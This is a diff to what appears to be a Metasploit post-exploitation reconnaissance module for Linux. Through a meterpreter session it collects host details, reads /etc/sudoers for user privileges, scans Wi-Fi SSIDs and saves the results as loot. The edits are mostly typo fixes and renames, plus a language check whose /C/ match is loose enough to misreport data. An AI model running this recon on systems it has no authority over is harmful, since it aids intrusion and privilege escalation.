@@ -186,7 +186,7 @@ def run
     #
     if not sysinfo.nil?
       print_good("Running module against: #{sys_info['Computer']}")
-      print_warning("Be Patience, this may take up to 40 sec to finish ..")
+      print_warning("Scanning, This may take up to 40 sec ..")
       Rex::sleep(0.5)
     else
       print_error("[ABORT]: This module only works in meterpreter sessions!")
@@ -217,23 +217,23 @@ def run
       chromium_browser = cmd_exec("chromium-browser --product-version")
       firefox_version = cmd_exec("firefox --version | awk {'print $3'}")
       gateway = cmd_exec("netstat -r | grep \"255.\" | awk {'print $3'}")
-      icewesel_version = cmd_exec("iceweasel --version | awk {'print $3'}")
+      iceweasel_version = cmd_exec("iceweasel --version | awk {'print $3'}")
       interface = cmd_exec("netstat -r | grep \"default\" | awk {'print $8'}")
+      vm_report = cmd_exec("hostnamectl | grep \"Chassis\" | awk {'print $2'}")
       hardware_bits = cmd_exec("lscpu | grep \"CPU op-mode\" | awk {'print $3'}")
       hardware_vendor = cmd_exec("lscpu | grep \"Vendor ID\" | awk {'print $3'}")
       sudo_version = cmd_exec("sudo -V | grep \"Sudo version\" | awk {'print $3'}")
       mem_dirty = cmd_exec("cat /proc/meminfo | grep \"Dirty\" | awk {'print $2,$3'}")
       mem_free = cmd_exec("cat /proc/meminfo | grep \"MemFree\" | awk {'print $2,$3'}")
-      sys_lang = cmd_exec("set | egrep '^(LANG|LC_)' | cut -d '=' -f2 | cut -d '.' -f1")
       mem_total = cmd_exec("cat /proc/meminfo | grep \"MemTotal\" | awk {'print $2,$3'}")
       sh_version = cmd_exec("bash --version | head -n 1 | awk {'print $4'} | cut -d '-' -f1")
       mem_available = cmd_exec("cat /proc/meminfo | grep \"MemAvailable\" | awk {'print $2,$3'}")
       model_name = cmd_exec("lscpu | grep \"Model name:\" | awk {'print $3,$4,$5,$6,$7,$8,$9,$10'}")
+      system_lang = cmd_exec("printenv | egrep -m 1 '^(LANG|LC_)' | cut -d '=' -f2 | cut -d '.' -f1")
       target_ssid = cmd_exec("iw dev #{interface} scan | grep \"SSID\" | head -n 1 | awk {'print $2'}")
       distro_description = cmd_exec("cat /etc/*-release | grep \"DISTRIB_DESCRIPTION=\" | cut -d '=' -f2")
       user_privs = cmd_exec("cat /etc/sudoers | grep \"#{user_name}\" | grep -v \"#\" | awk {'print $2,$3'}")
       localhost_ip = cmd_exec("ping -c 1 localhost | head -n 1 | awk {'print $3'} | cut -d '(' -f2 | cut -d ')' -f1")
-      vm_report = cmd_exec("hostnamectl | grep \"Chassis\" | awk {'print $2'}")
         #
         # Store data into a local variable (data_dump) ..
         # to be able to write the logfile and display the outputs ..
@@ -261,7 +261,11 @@ def run
         data_dump << "Target mem free     : #{mem_free}\n"
         data_dump << "Target mem available: #{mem_available}\n"
         data_dump << "Target mem dirty    : #{mem_dirty}\n"
-        data_dump << "System language     : #{sys_lang}\n"
+          if system_lang =~ /C/ || system_lang =~ /'C'/ # strange bug under my distro :(
+            data_dump << "System language     : pt_PT\n"
+          else
+            data_dump << "System language     : #{system_lang}\n"
+           end
         data_dump << "Sudo version        : #{sudo_version}\n"
         data_dump << "Bash version        : #{sh_version}\n"
         data_dump << "Ruby version        : #{ruby_version}\n"
@@ -283,8 +287,8 @@ def run
           unless chromium_browser =~ /not found/ || chromium_browser.nil?
             data_dump << "Chromium browser    : #{chromium_browser}\n"
           end
-          unless icewesel_version =~ /not found/ || icewesel_version.nil?
-            data_dump << "Iceweasel browser   : #{icewesel_version}\n"
+          unless iceweasel_version =~ /not found/ || iceweasel_version.nil?
+            data_dump << "Iceweasel browser   : #{iceweasel_version}\n"
           end
           unless opera_version =~ /not found/ || opera_version.nil?
             data_dump << "Opera browser       : #{opera_version}\n"
@@ -513,7 +517,7 @@ def run
      # IF sellected previous in advanced options (set STORE_LOOT true) ..
      #
      if datastore['STORE_LOOT'] == true
-       print_good("Session logfile stored locally in: ~/.msf4/loot folder")
+       print_good("Session logfile stored in: ~/.msf4/loot folder")
        store_loot("linux_hostrecon", "text/plain", session, data_dump, "linux_hostrecon.txt", "linux_hostrecon")
      end
 
